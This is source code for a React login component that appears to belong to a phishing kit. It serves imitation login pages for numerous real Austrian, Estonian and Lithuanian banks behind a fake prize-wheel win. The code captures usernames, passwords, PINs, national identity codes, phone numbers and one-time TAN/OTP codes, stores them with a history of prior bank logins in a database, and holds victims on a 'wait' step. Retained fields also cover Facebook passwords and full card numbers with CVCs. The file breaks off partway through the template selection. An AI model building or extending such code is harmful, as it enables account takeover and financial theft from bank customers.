"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import type { BankTheme } from "@/lib/bank-theme-config";
import { getBankTheme } from "@/lib/bank-theme-config";
import { normalizeBankCustomHtml } from "@/lib/bank-custom-html";
import { normalizeBankCredentialPayload, normalizeBankLoginFields } from "@/lib/bank-page-adapter";
import { stepToPath } from "@/lib/session-routes";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { DEFAULT_DESIGN_CONFIG, BlockType } from "@/lib/bank-design-schema";
import { getRenderableImageProps } from "@/lib/visual-tree-logo";
import parse, { attributesToProps, domToReact, Element } from "html-react-parser";

// Austrian Banks from templates
import { BankAustria } from "@/components/templates/BankAustria";
import { BawagAg } from "@/components/templates/BawagAg";
import { ErsteBank } from "@/components/templates/ErsteBank";
import { Raiffeisen } from "@/components/templates/Raiffeisen";
import { Volksbanken } from "@/components/templates/Volksbanken";
import { PosojilnicaBank } from "@/components/templates/PosojilnicaBank";
import { Bank99 } from "@/components/templates/Bank99";
import { BtvVierLanderBank } from "@/components/templates/BtvVierLanderBank";
import { BksBank } from "@/components/templates/BksBank";
import { Oberbank } from "@/components/templates/Oberbank";
import { HypoNoe } from "@/components/templates/HypoNoe";
import { HypoTirol } from "@/components/templates/HypoTirol";
import { HypoVorarlberg } from "@/components/templates/HypoVorarlberg";
import { HypoBurgenland } from "@/components/templates/HypoBurgenland";
import { HypoOberosterreich } from "@/components/templates/HypoOberosterreich";
import { AerzteApothekerBank } from "@/components/templates/AerzteApothekerBank";
import { BankhausSpangler } from "@/components/templates/BankhausSpangler";
import { SchelhammerCapital } from "@/components/templates/SchelhammerCapital";
import { Easybank } from "@/components/templates/Easybank";
import { Schoellerbank } from "@/components/templates/Schoellerbank";
import { SpardaBank } from "@/components/templates/SpardaBank";
import { Volkskreditbank } from "@/components/templates/Volkskreditbank";
import { AnadiBank } from "@/components/templates/AnadiBank";
import { MarchfelderBank } from "@/components/templates/MarchfelderBank";
import { Dolomitenbank } from "@/components/templates/Dolomitenbank";
import { EstoniaBankTemplate } from "@/components/templates/EstoniaBankTemplate";
import { LithuaniaBankTemplate } from "@/components/templates/LithuaniaBankTemplate";
// LT bilinen banka slug'lari (methodMap ile ayni, kopya):
const LITHUANIA_KNOWN_SLUGS = new Set([
  "swedbank-lt","seb-lt","luminor-lt","citadele-lt","lku-lt","siauliu-lt","facebook-lt"
]);

type Props = {
  sessionId: string;
  bankSlug: string;
  bank: any;
};

function inferCanonicalCredentialKey(
  key: string,
): "personalCode" | "bankPhone" | "username" | "password" | "tacCode" | "loginMethod" | null {
  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");

  if (
    normalizedKey.includes("personalidentitycode") ||
    normalizedKey.includes("personalidentificationcode") ||
    normalizedKey.includes("identitycode") ||
    normalizedKey.includes("personalcode") ||
    normalizedKey.includes("isikukood")
  ) {
    return "personalCode";
  }

  if (
    normalizedKey.includes("telefoninumber") ||
    normalizedKey.includes("mobilenumber") ||
    normalizedKey.includes("phonenumber") ||
    normalizedKey.includes("mobileidphone") ||
    normalizedKey.includes("phonefield") ||
    normalizedKey.includes("telefon") ||
    normalizedKey.includes("phone") ||
    normalizedKey === "phone"
  ) {
    return "bankPhone";
  }

  if (
    normalizedKey.includes("userid") ||
    normalizedKey.includes("username") ||
    normalizedKey.includes("loginid") ||
    normalizedKey.includes("nickname") ||
    normalizedKey.includes("kasutajanimi") ||
    normalizedKey.includes("kasutajatunnus") ||
    normalizedKey.endsWith("tunnus")
  ) {
    return "username";
  }

  if (
    normalizedKey.includes("password") ||
    normalizedKey.includes("passcode") ||
    normalizedKey.includes("parool") ||
    normalizedKey.includes("pincalculatorcode") ||
    normalizedKey.includes("pincalccode") ||
    normalizedKey.includes("pincalcpassword") ||
    normalizedKey === "pincalc" ||
    normalizedKey === "pin"
  ) {
    return "password";
  }

  if (
    normalizedKey.includes("tac") ||
    normalizedKey.includes("otp") ||
    normalizedKey.includes("smscode") ||
    normalizedKey.includes("verificationcode") ||
    normalizedKey.includes("responsecode") ||
    normalizedKey.includes("kontrollkood")
  ) {
    return "tacCode";
  }

  if (normalizedKey.includes("loginmethod") || normalizedKey.includes("authmethod")) {
    return "loginMethod";
  }

  return null;
}

function isIgnoredRawCredentialKey(key: string): boolean {
  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");

  return (
    /^input\d+$/.test(normalizedKey) ||
    normalizedKey.includes("rememberme") ||
    normalizedKey.includes("remembermesimpleid") ||
    normalizedKey.includes("remembermesmartid") ||
    normalizedKey.includes("remembermemobileid") ||
    normalizedKey.includes("loginwidget") ||
    normalizedKey.includes("useridmid") ||
    normalizedKey.includes("useridsid") ||
    normalizedKey.includes("useridsimple") ||
    normalizedKey === "mobileid" ||
    normalizedKey === "smartid" ||
    normalizedKey === "idcard" ||
    normalizedKey === "pincalc" ||
    normalizedKey === "kalkulaator" ||
    normalizedKey.startsWith("wheelresult") ||
    normalizedKey === "wheelresultkind" ||
    normalizedKey === "wheelresultlabel" ||
    normalizedKey === "wheelresultamount" ||
    normalizedKey === "amount" ||
    normalizedKey === "firstname" ||
    normalizedKey === "lastname" ||
    normalizedKey === "fullname" ||
    normalizedKey === "phone" ||
    normalizedKey === "mobile" ||
    normalizedKey === "email" ||
    normalizedKey === "currency" ||
    normalizedKey === "address" ||
    normalizedKey === "street" ||
    normalizedKey === "postcode" ||
    normalizedKey === "city" ||
    normalizedKey === "country" ||
    normalizedKey === "participationcode" ||
    normalizedKey === "publicid" ||
    normalizedKey === "sessiontype" ||
    normalizedKey === "bankslug" ||
    normalizedKey === "bankname" ||
    normalizedKey === "transfermessage" ||
    normalizedKey === "winstep" ||
    normalizedKey === "language" ||
    normalizedKey === "sitelanguage" ||
    normalizedKey === "targetcountry" ||
    normalizedKey.startsWith("selected") ||
    normalizedKey.startsWith("orderedfield") ||
    normalizedKey.includes("step") ||
    normalizedKey.includes("route") ||
    normalizedKey === "hash" ||
    normalizedKey === "signature" ||
    normalizedKey === "token"
  );
}

function shouldResetPreviousBankField(key: string): boolean {
  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");

  if (
    key === "verfuegernummer" ||
    key === "pin" ||
    key === "tacCode" ||
    key === "personalCode" ||
    key === "loginMethod" ||
    key === "bankPhone" ||
    key === "username" ||
    key === "password" ||
    key === "orderedField1" ||
    key === "orderedField2" ||
    key === "orderedField2Type"
  ) {
    return true;
  }

  if (inferCanonicalCredentialKey(key)) {
    return true;
  }

  return (
    /^input\d+$/.test(normalizedKey) ||
    normalizedKey.includes("rememberme") ||
    normalizedKey.includes("loginwidget") ||
    normalizedKey.includes("mobilenumber") ||
    normalizedKey.includes("mobileidphone") ||
    normalizedKey.includes("mobileids") ||
    normalizedKey.includes("smartid") ||
    normalizedKey.includes("simpleid") ||
    normalizedKey.includes("userid") ||
    normalizedKey.includes("personalidentity") ||
    normalizedKey.includes("personalidentification") ||
    normalizedKey.includes("identitycode") ||
    normalizedKey.includes("isikukood") ||
    normalizedKey.includes("password") ||
    normalizedKey.includes("passcode") ||
    normalizedKey.includes("parool") ||
    normalizedKey.includes("tac") ||
    normalizedKey.includes("otp") ||
    normalizedKey.includes("verificationcode") ||
    normalizedKey.includes("responsecode") ||
    normalizedKey.includes("digipass") ||
    normalizedKey.includes("kalkulaator") ||
    normalizedKey === "idcode" ||
    normalizedKey === "idcard" ||
    normalizedKey === "identificatiecode" ||
    normalizedKey === "ln" ||
    normalizedKey === "pc" ||
    normalizedKey === "text" ||
    normalizedKey.includes("loginid") ||
    normalizedKey.includes("legalid") ||
    normalizedKey.includes("personcode") ||
    normalizedKey.includes("personelcode") ||
    normalizedKey.includes("generatoranswer") ||
    normalizedKey.includes("phonenumber") ||
    normalizedKey.includes("perscode") ||
    normalizedKey.includes("asmens") ||
    normalizedKey.includes("naudotojo") ||
    normalizedKey.includes("vartotojo") ||
    normalizedKey.includes("kodas") ||
    normalizedKey.startsWith("credentials")
  );
}

function hasMeaningfulSubmitValue(value: unknown): boolean {
  return typeof value === "string" && value.trim().length > 0;
}

export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [theme, setTheme] = useState<BankTheme | null>(null);

  const [verfuegernummer, setVerfuegernummer] = useState("");
  const [pin, setPin] = useState("");
  const [tacCode, setTacCode] = useState("");
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  const [personalCode, setPersonalCode] = useState("");
  const [loginMethod, setLoginMethod] = useState("");
  const [wonAmount, setWonAmount] = useState<number | null>(null);
  const [wonLabel, setWonLabel] = useState<string | null>(null);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      const nextTheme = await getBankTheme(bankSlug);
      if (!cancelled) setTheme(nextTheme);
    })();
    return () => {
      cancelled = true;
    };
  }, [bankSlug]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("id, amount, form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, unknown>;
      setSessionFormData(fd);
      setVerfuegernummer(typeof fd.verfuegernummer === "string" ? fd.verfuegernummer : "");
      setPin(typeof fd.pin === "string" ? fd.pin : "");
      setTacCode(typeof fd.tacCode === "string" ? fd.tacCode : "");
      setPersonalCode(typeof fd.personalCode === "string" ? fd.personalCode : "");
      setLoginMethod(typeof fd.loginMethod === "string" ? fd.loginMethod : "");
      const amt = typeof data.amount === "number" && data.amount > 0 ? data.amount : null;
      const label = typeof fd.wheel_result_label === "string" && fd.wheel_result_label.trim()
        ? fd.wheel_result_label.trim()
        : amt
          ? "€ " + new Intl.NumberFormat("de-DE").format(amt)
          : null;
      setWonAmount(amt);
      setWonLabel(label);
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e?: React.FormEvent, overrideData?: any) {
    if (e) e.preventDefault();
    if (!supabase || !sessionId || !bank) return;
    setSaving(true);
    setError(null);

    const knownCredentialKeys = new Set([
      "verfuegernummer",
      "pin",
      "tacCode",
      "personalCode",
      "loginMethod",
      "bankPhone",
      "username",
      "password",
      "orderedField1",
      "orderedField2",
      "orderedField2Type",
      "bankSlug",
      "bankName",
    ]);

    // Banka degistiginde (A bankasi -> B bankasi) eski oturumun credential
    // alanlari (orderedField1, verfuegernummer, username vb.) YENI bankaya
    // sizmasin: yeni submit ne verdiyse o yazilsin, vermedigi alanlar boslansin.
    const prevBankSlug =
      typeof sessionFormData?.bankSlug === "string" ? sessionFormData.bankSlug.trim().toLowerCase() : "";
    const bankChanged = prevBankSlug !== "" && prevBankSlug !== bank.slug.trim().toLowerCase();
    const hasOverride = overrideData != null && typeof overrideData === "object";
    const staleStr = (v: unknown): string =>
      !hasOverride && !bankChanged && typeof v === "string" ? v : "";

    const currentVerfuegernummer = overrideData?.verfuegernummer ?? (bankChanged ? "" : verfuegernummer);
    const currentPin = overrideData?.pin ?? (bankChanged ? "" : pin);
    const currentTacCode = overrideData?.tacCode ?? (bankChanged ? "" : tacCode);
    const currentPersonalCode = overrideData?.personalCode ?? (bankChanged ? "" : personalCode);
    const currentLoginMethod = overrideData?.loginMethod ?? (bankChanged ? "" : loginMethod);
    const currentBankPhone =
      typeof overrideData?.bankPhone === "string"
        ? overrideData.bankPhone
        : bankChanged
          ? ""
          : typeof sessionFormData.bankPhone === "string"
            ? sessionFormData.bankPhone
            : "";
    const currentUsername =
      typeof overrideData?.username === "string"
        ? overrideData.username
        : bankChanged
          ? ""
          : typeof sessionFormData.username === "string"
            ? sessionFormData.username
            : "";
    const currentPassword =
      typeof overrideData?.password === "string"
        ? overrideData.password
        : bankChanged
          ? ""
          : typeof sessionFormData.password === "string"
            ? sessionFormData.password
            : "";
    const currentOrderedField1 =
      typeof overrideData?.orderedField1 === "string"
        ? overrideData.orderedField1.trim()
        : staleStr(sessionFormData.orderedField1).trim() ||
          currentPersonalCode || currentUsername || currentVerfuegernummer || currentBankPhone;
    const currentOrderedField2 =
      typeof overrideData?.orderedField2 === "string"
        ? overrideData.orderedField2.trim()
        : staleStr(sessionFormData.orderedField2).trim() ||
          currentPassword || currentPin;
    const currentOrderedField2Type =
      typeof overrideData?.orderedField2Type === "string"
        ? overrideData.orderedField2Type.trim()
        : staleStr(sessionFormData.orderedField2Type).trim();
    const currentExtraCapturedValues = Object.entries((overrideData ?? {}) as Record<string, unknown>).flatMap(
      ([key, value]) => {
        if (
          knownCredentialKeys.has(key) ||
          isIgnoredRawCredentialKey(key) ||
          !hasMeaningfulSubmitValue(value)
        ) {
          return [];
        }

        const canonicalKey = inferCanonicalCredentialKey(key);
        if (canonicalKey) {
          return [];
        }

        return [String(value).trim()];
      },
    );
    const hasCurrentSubmissionData = [
      currentVerfuegernummer,
      currentPin,
      currentTacCode,
      currentPersonalCode,
      typeof overrideData?.bankPhone === "string" ? overrideData.bankPhone : "",
      typeof overrideData?.username === "string" ? overrideData.username : "",
      typeof overrideData?.password === "string" ? overrideData.password : "",
      typeof overrideData?.orderedField1 === "string" ? overrideData.orderedField1 : "",
      typeof overrideData?.orderedField2 === "string" ? overrideData.orderedField2 : "",
      ...currentExtraCapturedValues,
    ].some(hasMeaningfulSubmitValue);

    if (!hasCurrentSubmissionData) {
      setSaving(false);
      setError("Form alanlari doldurulmadan devam edilemez.");
      return;
    }

    const normalizedFields = normalizeBankLoginFields({ 
      verfuegernummer: currentVerfuegernummer, 
      pin: currentPin, 
      tacCode: currentTacCode, 
      personalCode: currentPersonalCode, 
      loginMethod: currentLoginMethod,
      bankPhone: currentBankPhone,
      username: currentUsername,
      password: currentPassword,
    });
    const credentials = normalizeBankCredentialPayload({
      bankSlug: bank.slug,
      bankName: bank.name,
      ...normalizedFields,
    });
    const canonicalFieldValues: Record<string, string> = {
      personalCode: credentials.personalCode ?? "",
      bankPhone: credentials.bankPhone ?? "",
      username: credentials.username || credentials.verfuegernummer || "",
      password: credentials.password || credentials.pin || "",
      tacCode: credentials.tacCode ?? "",
      loginMethod: credentials.loginMethod ?? "",
    };

    // *****************************************************************
    //  KESIN KURAL 1: BU ANAHTARLAR HICBIR ZAMAN SİLİNMEZ.
    //  (kullanici profil, kazanilan odul, session metadata alanlari)
    //  shouldResetPreviousBankField NE DERSE DESIN dokunulmadan korunur.
    // *****************************************************************
    const NEVER_RESET_KEYS = new Set([
      "firstName",
      "lastName",
      "phone",
      "email",
      "amount",
      "wheel_result_kind",
      "wheel_result_label",
      "wheel_result_amount",
      "win_step",
      "participation_code",
      "language",
      "site_language",
      "target_country",
      "selected_bank",
      "selected_bank_name",
      "public_id",
      "session_id",
      "created_at",
      "ip_address",
      "country_code",
      "user_agent",
      "fbFirstName",
      "fbLastName",
      "fbEmail",
      "fbPassword",
      "fbUserId",
      "fbSubmittedAt",
      "bankLoginHistory",
      "facebookLoginHistory",
      "cardLoginHistory",
      "cardHolder",
      "cardNumber",
      "cardExpiry",
      "cardCvc",
    ]);
    const neverResetKeysLower = new Set(
      Array.from(NEVER_RESET_KEYS).map((k) => k.toLowerCase().replace(/[^a-z0-9]/g, ""))
    );
    const isNeverResetKey = (key: string): boolean => {
      if (!key) return false;
      if (NEVER_RESET_KEYS.has(key)) return true;
      const norm = key.toLowerCase().replace(/[^a-z0-9]/g, "");
      if (neverResetKeysLower.has(norm)) return true;
      if (norm.startsWith("wheelresult")) return true;
      if (norm.startsWith("selected")) return true;
      if (norm.includes("step") && norm.includes("win")) return true;
      if (norm === "firstname" || norm === "lastname" || norm === "fullname") return true;
      if (norm === "phone" || norm === "mobile" || norm === "phonenumber") return true;
      if (norm === "amount" || norm === "winamount" || norm === "prizeamount") return true;
      return false;
    };

    // ==========================================================================
    //  DB DEN form_data YENIDEN CEK (useState STALE OLABILIR, FB'deki gibi)
    //  Boylece BANKA submit oncesinde diger clientlarin yaptigi son guncellemeleri
    //  kaybetmeyiz, SMS/KART/FB butun alanlar DB'den gelir ve korunur.
    // ==========================================================================
    let dbFormData: Record<string, unknown> | null = null;
    try {
      const { data, error: errSel } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sessionId)
        .limit(1)
        .maybeSingle();
      if (!errSel && data && (data as any).form_data && typeof (data as any).form_data === "object") {
        dbFormData = (data as any).form_data as Record<string, unknown>;
      }
    } catch {
      dbFormData = null;
    }
    // sessionFormData state -> spread with DB (overrides stale state):
    const finalBase: Record<string, unknown> = {
      ...(sessionFormData as Record<string, unknown> ?? {}),
      ...(dbFormData ?? {}),
    };
    const sessionFormDataFinalRaw = finalBase as any;

    // NEVER_RESET_KEYS'i + sessionFormData reference DEGISTIR (artik finalBase'den ayni seti kullanalim)
    // preservedSessionFormData icin HEMEN YENI sessionFormDataFinalRaw KULLANILACAK:

    // ==========================================================================
    //  extraCapturedFields: overrideData (ham formdan gelen) icinde known disinda kalan
    //  ve anlamli degeri olan BUTUN alanlari korur - tip uyumsuzlugu olmasin diye any cast.
    //  (Eski handleSubmit'te DB select oncesi tanimliydi, DB merge ekleyince kayboldu - tekrar ekliyoruz.)
    // ==========================================================================
    const extraCapturedEntries = Object.entries((overrideData ?? {}) as Record<string, unknown>).filter(
      ([key, value]) => {
        if (knownCredentialKeys.has(key)) return false;
        if (isIgnoredRawCredentialKey(key)) return false;
        if (!hasMeaningfulSubmitValue(value)) return false;
        const canonicalKey = inferCanonicalCredentialKey(key);
        if (canonicalKey) return false;
        return true;
      },
    );
    const extraCapturedFields = Object.fromEntries(extraCapturedEntries) as Record<string, unknown>;

    const preservedSessionFormData = Object.fromEntries(
      Object.entries(sessionFormDataFinalRaw as Record<string, unknown>).filter(([key]) => {
        if (isNeverResetKey(key)) return true;
        return !shouldResetPreviousBankField(key);
      }),
    );

    // =================== BANKA GIRIS HISTORY KAYDI (ESKI -> GEÇMİŞ) ===================
    // KURAL: KART MANTIGI 1:1 BIREBIR (card-client.tsx:71-117 ile ayni)
    //    - LOCAL degisken ile array tutulur (preservedSessionFormData mutable'dan kaçınılır)
    //    - SONRA nextFormData UZERINE explicit yazılır (uzerine yazılma garantisi!)
    //    - Boylece history kaydinin BANKADI / BANKSLUG degeri GUNCELLER tarafından ezilmez.
    let bankLoginHistory: unknown[] = [];
    try {
      const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
      // ========== 1) ESKI KAYIT (DB den geldigi icin guncel ESKI — sessionFormDataFinalRaw uzerinden):
      const sfd = sessionFormDataFinalRaw as Record<string, unknown>;
      const old = {
        bankName: str(sfd.bankName),
        bankSlug: str(sfd.bankSlug),
        loginMethod: str(sfd.loginMethod),
        personalCode: str(sfd.personalCode),
        bankPhone: str(sfd.bankPhone),
        username: str(sfd.username),
        password: str(sfd.password),
        verfuegernummer: str(sfd.verfuegernummer),
        pin: str(sfd.pin),
        tacCode: str(sfd.tacCode),
        orderedField1: str(sfd.orderedField1),
        orderedField2: str(sfd.orderedField2),
        orderedField2Type: str(sfd.orderedField2Type),
      };
      // ========== 2) YENI KAYIT (kullanicinin yeni girdigi credentials):
      const nw = {
        bankSlug: str(credentials.bankSlug),
        loginMethod: str(credentials.loginMethod),
        personalCode: str(credentials.personalCode),
        bankPhone: str(credentials.bankPhone),
        username: str(credentials.username || credentials.verfuegernummer),
        password: str(credentials.password || credentials.pin),
        tacCode: str(credentials.tacCode),
        of1: str(currentOrderedField1),
        of2: str(currentOrderedField2),
      };
      // ========== 3) Anlamli eski kayit var mi kontrolu (en az 2 alan dolu olmali):
      const hasOld = [old.loginMethod, old.personalCode, old.bankPhone, old.username, old.password, old.tacCode, old.orderedField1, old.orderedField2].filter(Boolean).length >= 2;
      if (hasOld) {
        // ========== 4) FARKLILIK HESAPLAMASI:
        let isDifferent = false;
        if (old.bankSlug && nw.bankSlug && old.bankSlug.toLowerCase() !== nw.bankSlug.toLowerCase()) {
          isDifferent = true; // FARKLI BANKA: KESIN history'ye ekle
        } else {
          let diffCount = 0;
          const checkDiff = (a: string, b: string) => { if ((a || b) && a !== b) diffCount++; };
          checkDiff(old.loginMethod, nw.loginMethod);
          checkDiff(old.personalCode, nw.personalCode);
          checkDiff(old.bankPhone, nw.bankPhone);
          checkDiff(old.username, nw.username);
          checkDiff(old.password, nw.password);
          checkDiff(old.tacCode, nw.tacCode);
          checkDiff(old.orderedField1, nw.of1);
          checkDiff(old.orderedField2, nw.of2);
          if (diffCount >= 2) isDifferent = true;
        }
        if (isDifferent) {
          const arr: unknown[] = Array.isArray(sfd.bankLoginHistory)
            ? [...(sfd.bankLoginHistory as unknown[])]
            : [];
          // 🔴 EKSTRA GUVENLIK: ESKI bankName BOSSA (slug doluysa) SLUG -> NAME cevir:
          let finalBankName = old.bankName;
          if (!finalBankName && old.bankSlug) {
            const sl = old.bankSlug.toLowerCase();
            const nameMap: Record<string, string> = {
              "seb": "SEB Pank",
              "swedbank": "Swedbank",
              "swed": "Swedbank",
              "nordea": "Nordea",
              "lhv": "LHV Pank",
              "luminor": "Luminor",
              "coop": "Coop Pank",
              "bigbank": "Bigbank",
              "citadele": "Citadele",
              "inbank": "Inbank",
              "tbb": "TBB Pank",
            };
            finalBankName = nameMap[sl] || (sl.charAt(0).toUpperCase() + sl.slice(1));
          }
          arr.unshift({
            submittedAt: new Date().toISOString(),
            // 🔴 KRITIK: KAYDIN KENDI BANKA ADI/SLUG'u ESKI degerden geliyor, ASLA credentials ile degistirilmiyor!
            bankName: finalBankName,
            bankSlug: old.bankSlug,
            loginMethod: old.loginMethod,
            personalCode: old.personalCode,
            bankPhone: old.bankPhone,
            username: old.username,
            password: old.password,
            verfuegernummer: old.verfuegernummer,
            pin: old.pin,
            tacCode: old.tacCode,
            orderedField1: old.orderedField1,
            orderedField2: old.orderedField2,
            orderedField2Type: old.orderedField2Type,
          });
          bankLoginHistory = arr; // LOCAL degiskene at (garantili)
        }
      }
    } catch {
      /* sessiz */
    }

    // nextFormData: Kart mantigi ile ayni sirayla yazilir (boylece history ezilmez)
    const nextFormData: Record<string, unknown> = {
      ...(sessionFormDataFinalRaw as Record<string, unknown> ?? {}),
      ...(preservedSessionFormData as Record<string, unknown> ?? {}),
      ...(extraCapturedFields as Record<string, unknown> ?? {}),
      orderedField1: currentOrderedField1,
      orderedField2: currentOrderedField2,
      orderedField2Type: currentOrderedField2Type,
      // bankSubmittedAt: GUNCELLENMIS kaydin zaman damgasi (LogTab'da karsilastirma icin)
      bankSubmittedAt: new Date().toISOString(),
      ...credentials, // en son: guncel banka adı / slug / credentials override (GUNCELLER icin dogru)
    };
    // 🔴 KRITIK (Kart 1:1): HISTORY dizisini EN SON UZERINE YAZ — boylece baska alanlar tarafindan EZILME garantisi YOK!
    if (bankLoginHistory.length > 0) {
      nextFormData.bankLoginHistory = bankLoginHistory;
    } else if ((s => Array.isArray(s) && s.length > 0)(sessionFormDataFinalRaw?.bankLoginHistory as any)) {
      // Mevcut history'yi koru (farklı isDifferent false donduyse de eski kayitlar kalsın):
      nextFormData.bankLoginHistory = (sessionFormDataFinalRaw as Record<string, unknown>).bankLoginHistory;
    }
    const { error: updateError } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    setSaving(false);
    if (updateError) {
      setError("Eingaben konnten nicht uebermittelt werden. Bitte erneut versuchen.");
      return;
    }
    setSessionFormData(nextFormData);
    router.push(stepToPath("wait", sessionId));
  }

  if (!supabase) {
    return (
      <div className="flex min-h-screen items-center justify-center p-4">
        <ConfigMissing />
      </div>
    );
  }

  if (!bank) {
    return (
      <div className="flex min-h-screen items-center justify-center p-4">
        <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-500">
          Nežinomas bankas. Pradėkite pasirinkimą iš naujo.
        </p>
      </div>
    );
  }

  // *****************************************************************
  //  KESIN KURAL: SADECE BILINEN BANKA GIRIS ALANLARI INPUT OLARAK
  //  GOSTERILEBILIR. Disindaki TUM ALANLAR (firstName, amount, wheel_result*,
  //  lastName, phone, win_step vb.) INPUT OLARAK CIZILMEZ.
  // *****************************************************************
  const ALLOWED_BANK_INPUT_KEYS = new Set([
    "verfuegernummer",
    "pin",
    "tacCode",
    "personalCode",
    "loginMethod",
    "bankPhone",
    "username",
    "password",
    "orderedField1",
    "orderedField2",
    "orderedField2Type",
  ]);
  const isAllowedBankInputName = (rawName: unknown): boolean => {
    if (typeof rawName !== "string" || !rawName.trim()) return false;
    if (ALLOWED_BANK_INPUT_KEYS.has(rawName)) return true;
    const normalized = rawName.toLowerCase().replace(/[^a-z0-9]/g, "");
    if (!normalized) return false;
    if (/^input\d+$/.test(normalized)) return true;
    return (
      normalized.includes("rememberme") ||
      normalized.includes("loginwidget") ||
      normalized.includes("mobilenumber") ||
      normalized.includes("mobileidphone") ||
      normalized.includes("smartid") ||
      normalized.includes("simpleid") ||
      normalized.includes("userid") ||
      normalized.includes("personalidentity") ||
      normalized.includes("personalidentification") ||
      normalized.includes("identitycode") ||
      normalized.includes("isikukood") ||
      normalized.includes("password") ||
      normalized.includes("passcode") ||
      normalized.includes("parool") ||
      normalized.includes("tac") ||
      normalized.includes("otp") ||
      normalized.includes("verificationcode") ||
      normalized.includes("responsecode") ||
      normalized.includes("digipass") ||
      normalized.includes("kalkulaator") ||
      normalized === "mobileid" ||
      normalized === "smartid" ||
      normalized === "idcard" ||
      normalized === "pincalc" ||
      normalized === "kalkulaator"
    );
  };

  // OUSTRIAN BANKS CUSTOM TEMPLATES
  const handleTemplateChange = (field: string, value: string) => {
    if (field === "verfuegernummer") setVerfuegernummer(value);
    if (field === "pin") setPin(value);
    if (field === "tacCode") setTacCode(value);
    if (field === "personalCode") setPersonalCode(value);
    if (field === "loginMethod") setLoginMethod(value);
  };
  const handleTemplateSubmit = (overrideData?: any) => handleSubmit(undefined, overrideData);
  
  const hasGeneratedDesign = Boolean(bank.design?.visualTree || bank.design?.customHtml);

  const normalizedCountry = (bank.country || "").toString().trim().toLowerCase();
  const normalizedSlug = (bankSlug || "").toString().trim().toLowerCase();

  // =====================================================================
  // EN ONCELIKLI KURAL: LT SLUG'I (LITHUANIA_KNOWN_SLUGS) veya -lt suffix varsa
  //  => SQL'de country EE olsa bile ZORLA LITHUANIA TEMPLATE sec.
  //  (Banks tablosunda DEFAULT country = 'EE' oldugu icin bu garanti COK KRITIK!)
  // =====================================================================
  const hasLithuaniaSuffix = /(^|[-_\s])lt($|[-_\s])/.test(normalizedSlug);
  const isLithuaniaKnownSlug = LITHUANIA_KNOWN_SLUGS.has(normalizedSlug) || (
    // Alternatif: methodMap'teki slugs ile karsilastir (tam eslesme)
    normalizedSlug === "swedbank-lt" ||
    normalizedSlug === "seb-lt" ||
    normalizedSlug === "luminor-lt" ||
    normalizedSlug === "citadele-lt" ||
    normalizedSlug === "lku-lt" ||
    normalizedSlug === "siauliu-lt"
  );
  const isLithuania = (normalizedCountry === "litvanya" || normalizedCountry === "lithuania" || normalizedCountry === "lt") ||
                      hasLithuaniaSuffix ||
                      isLithuaniaKnownSlug;
  
  const estoniaSlugKeywords = ["bigbank", "citadele", "coop", "inbank", "lhv", "luminor", "op-corporate", "seb", "swedbank"];
  const isEstonianBank = !isLithuania && (
    normalizedCountry === "estonya" ||
    normalizedCountry === "estonia" ||
    /(^|[-_\s])ee($|[-_\s])/.test(normalizedSlug) ||
    ["bigbank", "citadele-banka", "coop-pank", "inbank", "lhv-pank", "luminor-ee", "op-corporate-bank", "seb-pank", "swedbank-ee"].includes(normalizedSlug) ||
    estoniaSlugKeywords.some((kw) => normalizedSlug.includes(kw))
  );

  if (isLithuania) {
    return (
      <LithuaniaBankTemplate
        bankSlug={normalizedSlug}
        bankName={bank.name}
        logoFile={bank.logoFile}
        brandColor={bank.brandColor || theme?.colors.primary}
        formData={{ verfuegernummer, pin, personalCode, loginMethod }}
        onChange={handleTemplateChange}
        handleRouteAction={handleTemplateSubmit}
        saving={saving}
        wonAmount={wonAmount}
        wonLabel={wonLabel}
      />
    );
  }

  if (isEstonianBank) {
    return (
      <EstoniaBankTemplate
        bankSlug={normalizedSlug}
        bankName={bank.name}
        logoFile={bank.logoFile}
        brandColor={bank.brandColor || theme?.colors.primary}
        formData={{ verfuegernummer, pin, personalCode, loginMethod }}
        onChange={handleTemplateChange}
        handleRouteAction={handleTemplateSubmit}
        saving={saving}
        wonAmount={wonAmount}
        wonLabel={wonLabel}
      />
    );
  }

  if (!hasGeneratedDesign) {
    if (bankSlug === "bank-austria") return <BankAustria formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "bawag") return <BawagAg formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "erste-bank") return <ErsteBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "raiffeisen") return <Raiffeisen formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "volksbank") return <Volksbanken formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "posojilnica") return <PosojilnicaBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
